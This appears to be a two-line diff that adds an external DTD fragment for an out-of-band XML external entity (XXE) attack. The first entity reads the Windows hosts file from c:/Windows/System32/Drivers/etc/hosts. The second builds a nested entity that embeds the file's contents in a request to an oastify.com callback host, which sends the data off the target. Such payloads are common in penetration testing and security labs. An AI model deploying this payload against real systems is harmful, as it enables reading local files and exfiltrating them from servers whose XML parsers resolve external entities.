@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/Windows/System32/Drivers/etc/hosts">
+<!ENTITY % url "<!ENTITY &#x25; exfil SYSTEM 'http://%data;.fj2sdd62fu222xrfa7wq5egtlkrafz.oastify.com/capture'>">
